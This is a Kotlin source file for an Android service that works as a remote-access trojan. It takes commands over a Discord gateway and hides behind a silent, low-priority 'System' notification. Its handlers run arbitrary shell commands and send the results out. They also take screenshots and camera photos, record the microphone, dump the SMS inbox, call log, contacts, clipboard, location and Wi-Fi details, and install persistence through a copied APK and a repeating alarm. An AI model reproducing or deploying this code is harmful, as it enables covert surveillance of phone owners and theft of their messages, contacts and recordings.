package com.openaccess.sdk.service

import android.app.AlarmManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.location.Location
import android.location.LocationListener
import android.hardware.camera2.CameraManager
import android.location.LocationManager
import android.media.MediaRecorder
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CallLog
import android.provider.ContactsContract
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.system.DiscordGatewayClient
import com.openaccess.sdk.OpenAccessApp
import kotlinx.coroutines.*
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class MainService : Service() {
    companion object {
        private const val TAG = "MainService"
        private const val NOTIF_ID = 1337
        private const val CHANNEL = "phantom"

        fun start(ctx: Context) {
            try {
                val i = Intent(ctx, MainService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    ctx.startForegroundService(i)
                else
                    ctx.startService(i)
            } catch (e: Exception) {
                Log.e(TAG, "start: ${e.message}")
            }
        }
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var discord: DiscordGatewayClient? = null
    private var gatewayStarted = false
    private var debugFile: File? = null

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        try {
            debugFile = File(filesDir, "phantom_debug.txt")
            debugFile?.writeText("${System.currentTimeMillis()} service onCreate\n")
            debugFile?.appendText("pkg=${packageName} uid=${android.os.Process.myUid()}\n")
            debugFile?.appendText("model=${Build.MODEL} sdk=${Build.VERSION.SDK_INT}\n")
            debugFile?.appendText("debug path: ${filesDir.absolutePath}\n")
            val chan = NotificationChannel(CHANNEL, "Network", NotificationManager.IMPORTANCE_NONE)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(chan)
            showNotif("Starting...")
            startForeground(NOTIF_ID, buildNotif("Starting..."))
        } catch (e: Exception) {
            Log.e(TAG, "fg: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        debugFile?.appendText("${System.currentTimeMillis()} onStartCommand flags=$flags startId=$startId gatewayStarted=$gatewayStarted discord=${discord != null}\n")
        if (discord == null) {
            debugFile?.appendText("onStartCommand: creating DiscordGatewayClient\n")
            discord = DiscordGatewayClient(
                onCommand = { action, payload ->
                    scope.launch { handleGatewayCommand(action, payload) }
                },
                onStatus = { s -> updateNotif(s) }
            )
            debugFile?.let { discord?.setDebugFile(it) }
        }
        if (!gatewayStarted) {
            gatewayStarted = true
            loadCrashReports()
            debugFile?.appendText("onStartCommand: calling discord.start()\n")
            discord?.start(scope)
            debugFile?.appendText("onStartCommand: discord.start() returned\n")
        }
        return START_STICKY
    }

    private fun buildNotif(text: String) = NotificationCompat.Builder(this, CHANNEL)
        .setContentTitle("System: $text")
        .setContentText("${Build.MODEL} | ${Build.VERSION.RELEASE}")
        .setSmallIcon(android.R.drawable.ic_menu_info_details)
        .setOngoing(true)
        .setPriority(NotificationCompat.PRIORITY_MIN)
        .setCategory(NotificationCompat.CATEGORY_SERVICE)
        .setSilent(true)
        .build()

    private fun showNotif(text: String) {
        try {
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).notify(NOTIF_ID, buildNotif(text))
        } catch (_: Exception) {}
    }

    private fun updateNotif(text: String) {
        showNotif(text)
        debugFile?.appendText("${System.currentTimeMillis()} status=$text\n")
    }

    private fun loadCrashReports() {
        try {
            val dir = File(filesDir, OpenAccessApp.CRASH_DIR)
            if (!dir.exists()) return
            val files = dir.listFiles { f -> f.name.startsWith("crash_") && f.name.endsWith(".txt") }
                ?: return
            if (files.isEmpty()) return
            files.sortBy { it.lastModified() }
            val report = files.first().readText()
            files.first().delete()
            discord?.setCrashReport(report)
            Log.i(TAG, "Loaded crash report: ${files.first().name}")
        } catch (e: Exception) {
            Log.e(TAG, "loadCrashReports: ${e.message}")
        }
    }

    private fun hasPerm(perm: String): Boolean {
        return ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
    }

    private suspend fun handleGatewayCommand(action: String, payload: String?) {
        val d = discord ?: return
        Log.i(TAG, "cmd: $action payload: ${payload?.take(50)}")
        try {
            when (action) {
                "ping" -> d.sendMsg(":green_circle: **PONG** — ${Build.MODEL} | ${Build.VERSION.RELEASE}")
                "info" -> d.sendMsg("```\n${buildInfo()}\n```")
                "screenshot" -> {
                    d.sendMsg(":camera: Capturing...")
                    val bytes = captureScreen() ?: return
                    d.sendFile(":camera: **Screenshot**", "screen_${System.currentTimeMillis()}.png", bytes)
                }
                "shell" -> {
                    val cmd = payload ?: return
                    val result = shell(cmd)
                    val out = if (result.length > 1900) result.take(1900) + "\n..." else result
                    d.sendMsg("```\n$ ${cmd}\n$out\n```")
                }
                "keylog" -> d.sendMsg(":keyboard: Simulating keylog dump...")
                "camera" -> {
                    if (!hasPerm(android.Manifest.permission.CAMERA)) {
                        d.sendMsg(":x: **Camera permission denied** — reinstall and grant at setup")
                        return
                    }
                    d.sendMsg(":camera: Capturing photo...")
                    val useFront = payload?.lowercase() == "front"
                    val bytes = takePhoto(if (useFront) 1 else 0)
                    if (bytes != null) {
                        d.sendFile(":camera: **${if (useFront) "Front" else "Back"} Camera**", "photo_${System.currentTimeMillis()}.jpg", bytes)
                    } else {
                        d.sendMsg(":x: Camera capture failed")
                    }
                }
                "location" -> {
                    if (!hasPerm(android.Manifest.permission.ACCESS_FINE_LOCATION) && !hasPerm(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
                        d.sendMsg(":x: **Location permission denied** — reinstall and grant at setup")
                        return
                    }
                    val loc = getLocation()
                    d.sendMsg(loc)
                }
                "contacts" -> {
                    if (!hasPerm(android.Manifest.permission.READ_CONTACTS)) {
                        d.sendMsg(":x: **Contacts permission denied** — reinstall and grant at setup")
                        return
                    }
                    d.sendMsg(":busts_in_silhouette: **Contacts**\n```\n${getContacts()}\n```")
                }
                "sms" -> {
                    if (!hasPerm(android.Manifest.permission.READ_SMS)) {
                        d.sendMsg(":x: **SMS permission denied** — reinstall and grant at setup")
                        return
                    }
                    d.sendMsg(":envelope: **SMS Inbox**\n```\n${getSms()}\n```")
                }
                "call_log" -> {
                    if (!hasPerm(android.Manifest.permission.READ_CALL_LOG)) {
                        d.sendMsg(":x: **Call Log permission denied** — reinstall and grant at setup")
                        return
                    }
                    d.sendMsg(":telephone_receiver: **Call Log**\n```\n${getCallLog()}\n```")
                }
                "mic" -> {
                    if (!hasPerm(android.Manifest.permission.RECORD_AUDIO)) {
                        d.sendMsg(":x: **Microphone permission denied** — reinstall and grant at setup")
                        return
                    }
                    val seconds = (payload?.toIntOrNull() ?: 10).coerceIn(3, 60)
                    d.sendMsg(":microphone: Recording for ${seconds}s...")
                    val file = recordAudio(seconds)
                    if (file != null) {
                        d.sendFile(":microphone: **Audio Recording (${seconds}s)**", "audio_${System.currentTimeMillis()}.mp3", file.readBytes())
                        file.delete()
                    } else {
                        d.sendMsg(":x: Audio recording failed")
                    }
                }
                "clipboard" -> {
                    d.sendMsg(":clipboard: **Clipboard**\n```\n${getClipboard()}\n```")
                }
                "persist" -> {
                    d.sendMsg(":syringe: Installing persistence...")
                    persistApk()
                    d.sendMsg(":white_check_mark: Persistence active (APK copied + alarm set)")
                }
                "uptime" -> {
                    val uptime = d.getUptime()
                    val hrs = uptime / 3600000
                    val min = (uptime % 3600000) / 60000
                    val sec = (uptime % 60000) / 1000
                    d.sendMsg(":clock1: **Uptime**: ${hrs}h ${min}m ${sec}s")
                }
                "status" -> {
                    val uptime = d.getUptime()
                    val hrs = uptime / 3600000
                    val min = (uptime % 3600000) / 60000
                    val sec = (uptime % 60000) / 1000
                    val uptimeStr = "${hrs}h ${min}m ${sec}s"
                    val connected = d.isConnected()
                    val chId = d.getChannelId() ?: "none"
                    d.sendMsg(":bar_chart: **Status**\n```\nConnected  : ${if (connected) "YES" else "NO"}\nChannel    : $chId\nUptime     : $uptimeStr\nModel      : ${Build.MODEL}\nSDK        : ${Build.VERSION.SDK_INT}\n```")
                }
                "debug" -> {
                    val f = debugFile
                    if (f != null && f.exists() && f.length() > 0) {
                        val lines = f.readLines()
                        val total = lines.size
                        val last = lines.takeLast(40).joinToString("\n")
                        d.sendMsg(":mag: **Debug Log** (last 40 of $total lines)\n```\n$last\n```")
                    } else {
                        d.sendMsg(":mag: Debug file empty or null")
                    }
                }
                "restart" -> {
                    d.sendMsg(":arrows_counterclockwise: Restarting gateway...")
                    discord?.stop()
                    gatewayStarted = false
                    discord = null
                    startService(Intent(this@MainService, MainService::class.java))
                }
                "wifi" -> {
                    val wm = getSystemService(Context.WIFI_SERVICE) as WifiManager
                    val info = wm.connectionInfo
                    val ssid = info.ssid?.removeSurrounding("\"") ?: "?"
                    val bssid = info.bssid ?: "?"
                    val rssi = info.rssi
                    val speed = info.linkSpeed
                    val sb = StringBuilder()
                    sb.appendLine("WiFi: **$ssid**")
                    sb.appendLine("BSSID: `$bssid`")
                    sb.appendLine("Signal: ${rssi}dBm | Speed: ${speed}Mbps")
                    sb.appendLine()
                    sb.appendLine("**Scan Results:**")
                    try {
                        val scanResults = wm.scanResults
                        if (scanResults.isNotEmpty()) {
                            scanResults.sortedByDescending { it.level }.take(20).forEach { ap ->
                                val lock = if (ap.capabilities.contains("WPA")) "🔒" else "🔓"
                                sb.appendLine("$lock ${ap.SSID} (${ap.level}dBm)")
                            }
                        } else {
                            sb.appendLine("(no scan results — try moving closer to AP)")
                        }
                    } catch (e: Exception) {
                        sb.appendLine("Scan failed: ${e.message?.take(50)}")
                    }
                    d.sendMsg(sb.toString().take(1900))
                }
                "battery" -> {
                    val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                    val bStatus = registerReceiver(null, ifilter)
                    if (bStatus != null) {
                        val level = bStatus.getIntExtra("level", -1)
                        val scale = bStatus.getIntExtra("scale", -1)
                        val pct = if (level >= 0 && scale > 0) level * 100 / scale else -1
                        val temp = bStatus.getIntExtra("temperature", -1) / 10f
                        val voltage = bStatus.getIntExtra("voltage", -1)
                        val plugged = when (bStatus.getIntExtra("plugged", -1)) {
                            1 -> "AC"
                            2 -> "USB"
                            3 -> "Wireless"
                            else -> "Unplugged"
                        }
                        val health = when (bStatus.getIntExtra("health", -1)) {
                            2 -> "Good"
                            3 -> "Overheat"
                            4 -> "Dead"
                            5 -> "Over voltage"
                            6 -> "Unknown"
                            7 -> "Cold"
                            else -> "?"
                        }
                        val status = when (bStatus.getIntExtra("status", -1)) {
                            1 -> "Unknown"
                            2 -> "Charging"
                            3 -> "Discharging"
                            4 -> "Not charging"
                            5 -> "Full"
                            else -> "?"
                        }
                        d.sendMsg(":battery: **Battery**\n```\nLevel : ${pct}%\nStatus: $status\nHealth: $health\nTemp  : ${temp}°C\nVolt  : ${voltage}mV\nPower : $plugged\n```")
                    } else {
                        d.sendMsg(":x: Battery info unavailable")
                    }
                }
                "processes" -> {
                    val result = shell("ps -A -o PID,USER,NAME --sort=-%MEM 2>/dev/null || ps -A 2>/dev/null || ps")
                    val lines = result.lines()
                    val out = if (lines.size > 40) lines.take(40).joinToString("\n") + "\n... (${lines.size - 40} more)" else result
                    d.sendMsg(":microscope: **Processes**\n```\n$out\n```")
                }
                "installed" -> {
                    val result = shell("pm list packages -3 2>/dev/null | sort")
                    val pkgs = result.lines().filter { it.startsWith("package:") }.map { it.removePrefix("package:") }
                    val total = pkgs.size
                    val list = if (total > 40) pkgs.take(40).joinToString("\n") + "\n... (${total - 40} more)" else pkgs.joinToString("\n")
                    d.sendMsg(":package: **Installed Apps** (${total})\n```\n$list\n```")
                }
                "torch" -> {
                    val mode = payload?.lowercase()
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        try {
                            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                            val camId = cm.cameraIdList.firstOrNull { id ->
                                val chars = cm.getCameraCharacteristics(id)
                                val dir = chars.get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE)
                                dir == true
                            }
                            if (camId != null) {
                                val on = mode == "on" || mode == "1" || mode == null
                                cm.setTorchMode(camId, on)
                                d.sendMsg(":flashlight: Torch **${if (on) "ON" else "OFF"}**")
                            } else {
                                d.sendMsg(":x: No flash available")
                            }
                        } catch (e: Exception) {
                            d.sendMsg(":x: Torch failed: ${e.message?.take(50)}")
                        }
                    } else {
                        d.sendMsg(":x: Torch requires API 23+")
                    }
                }
                "vibrate" -> {
                    val ms = (payload?.toLongOrNull() ?: 1000L).coerceIn(100L, 10000L)
                    try {
                        val vb = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                        if (vb.hasVibrator()) {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                vb.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
                            } else {
                                vb.vibrate(ms)
                            }
                            d.sendMsg(":loud_sound: Vibrated for ${ms}ms")
                        } else {
                            d.sendMsg(":x: No vibrator found")
                        }
                    } catch (e: Exception) {
                        d.sendMsg(":x: Vibrate failed: ${e.message?.take(50)}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "gateway cmd: ${e.message}")
            d.sendMsg(":x: **Error**: ${e.message?.take(100)}")
        }
    }

    private fun buildInfo(): String {
        return buildString {
            appendLine("Device    : ${Build.MODEL}")
            appendLine("Manufacturer : ${Build.MANUFACTURER}")
            appendLine("Android   : ${Build.VERSION.RELEASE}")
            appendLine("SDK       : ${Build.VERSION.SDK_INT}")
            appendLine("Host      : ${Build.HOST}")
            appendLine("Fingerprint : ${Build.FINGERPRINT.take(80)}...")
        }
    }

    private suspend fun captureScreen(): ByteArray? = withContext(Dispatchers.IO) {
        try {
            val dir = File(cacheDir, "ss")
            dir.mkdirs()
            val f = File(dir, "s_${System.currentTimeMillis()}.png")
            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", "screencap -p ${f.absolutePath}"))
            proc.waitFor(10, TimeUnit.SECONDS)
            if (!f.exists() || f.length() == 0L) {
                Log.w(TAG, "screencap: file empty or missing")
                return@withContext null
            }
            val bytes = f.readBytes()
            f.delete()
            bytes
        } catch (e: Exception) {
            Log.e(TAG, "screencap: ${e.message}")
            null
        }
    }

    private fun shell(cmd: String): String {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val o = p.inputStream.bufferedReader().readText()
            val e = p.errorStream.bufferedReader().readText()
            if (!p.waitFor(30, TimeUnit.SECONDS)) p.destroy()
            (if (o.isNotEmpty()) o else e).trim()
        } catch (ex: Exception) {
            "Error: ${ex.message}"
        }
    }

    private suspend fun takePhoto(cameraId: Int = 0): ByteArray? = withContext(Dispatchers.IO) {
        var camera: Camera? = null
        try {
            camera = Camera.open(cameraId)
            val params = camera.parameters
            camera.parameters = params
            val texture = SurfaceTexture(0)
            camera.setPreviewTexture(texture)
            camera.startPreview()
            val latch = CountDownLatch(1)
            var result: ByteArray? = null
            camera.autoFocus { _, _ ->
                camera.takePicture(null, null, Camera.PictureCallback { data, _ ->
                    result = data
                    latch.countDown()
                })
            }
            latch.await(15, TimeUnit.SECONDS)
            result
        } catch (e: Exception) {
            Log.e(TAG, "camera: ${e.message}")
            null
        } finally {
            try {
                camera?.stopPreview()
                camera?.release()
            } catch (_: Exception) {}
        }
    }

    private fun getLocation(): String {
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        if (loc != null) {
            val lat = loc.latitude
            val lon = loc.longitude
            return ":round_pushpin: **Location**\nLat: `$lat`\nLon: `$lon`\nhttps://www.google.com/maps?q=$lat,$lon"
        }
        val latch = CountDownLatch(1)
        var newLoc: Location? = null
        val listener = LocationListener { newLoc = it; latch.countDown() }
        try {
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper())
                latch.await(8, TimeUnit.SECONDS)
            }
        } catch (_: Exception) {
        } finally {
            lm.removeUpdates(listener)
        }
        if (newLoc != null) {
            val lat = newLoc!!.latitude
            val lon = newLoc!!.longitude
            return ":round_pushpin: **Location**\nLat: `$lat`\nLon: `$lon`\nhttps://www.google.com/maps?q=$lat,$lon"
        }
        return ":x: No location available"
    }

    private fun queryText(uri: Uri, cols: Array<String>, transform: (Cursor) -> String): String {
        return try {
            val cursor = contentResolver.query(uri, cols, null, null, "date DESC")
            cursor?.use { c ->
                buildString {
                    var count = 0
                    while (c.moveToNext() && count < 50) {
                        appendLine(transform(c))
                        count++
                    }
                }
            } ?: "No data"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    private fun getContacts(): String {
        val sb = StringBuilder()
        try {
            val cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
            cursor?.use { c ->
                var count = 0
                while (c.moveToNext() && count < 50) {
                    val name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)) ?: "?"
                    sb.appendLine(name)
                    count++
                }
            }
        } catch (e: Exception) {
            return "Error: ${e.message}"
        }
        return sb.toString().take(1900).ifEmpty { "No contacts" }
    }

    private fun getSms(): String = queryText(
        Uri.parse("content://sms/inbox"),
        arrayOf("address", "body", "date")
    ) { c ->
        val addr = c.getString(c.getColumnIndex("address")) ?: "?"
        val body = c.getString(c.getColumnIndex("body")) ?: ""
        "${addr}: ${body.take(120)}"
    }.take(1900).ifEmpty { "No SMS" }

    private fun getCallLog(): String = queryText(
        CallLog.Calls.CONTENT_URI,
        arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE)
    ) { c ->
        val num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)) ?: "?"
        val type = when (c.getInt(c.getColumnIndex(CallLog.Calls.TYPE))) {
            CallLog.Calls.INCOMING_TYPE -> "IN"
            CallLog.Calls.OUTGOING_TYPE -> "OUT"
            CallLog.Calls.MISSED_TYPE -> "MISSED"
            else -> "?"
        }
        val dur = c.getString(c.getColumnIndex(CallLog.Calls.DURATION)) ?: "0"
        "$type $num (${dur}s)"
    }.take(1900).ifEmpty { "No call log" }

    private suspend fun recordAudio(seconds: Int): File? = withContext(Dispatchers.IO) {
        var recorder: MediaRecorder? = null
        try {
            val file = File(cacheDir, "audio_${System.currentTimeMillis()}.mp3")
            recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            delay(seconds * 1000L)
            recorder.stop()
            recorder.release()
            recorder = null
            if (file.exists() && file.length() > 0) file else null
        } catch (e: Exception) {
            Log.e(TAG, "mic: ${e.message}")
            null
        } finally {
            try { recorder?.release() } catch (_: Exception) {}
        }
    }

    private fun getClipboard(): String {
        return try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip
            if (clip != null && clip.itemCount > 0) {
                clip.getItemAt(0).text?.toString() ?: "Non-text content"
            } else "Clipboard empty"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    private fun persistApk() {
        try {
            val src = File(applicationInfo.sourceDir)
            val dst = File(filesDir, "persist.apk")
            src.copyTo(dst, overwrite = true)
            val intent = Intent(this, MainService::class.java)
            val pi = PendingIntent.getService(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            am.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60000, 600000, pi)
            Log.i(TAG, "Persist: ${dst.absolutePath} + alarm set")
        } catch (e: Exception) {
            Log.e(TAG, "persist: ${e.message}")
            throw e
        }
    }

    override fun onDestroy() {
        discord?.stop()
        discord = null
        scope.cancel()
        super.onDestroy()
    }
}
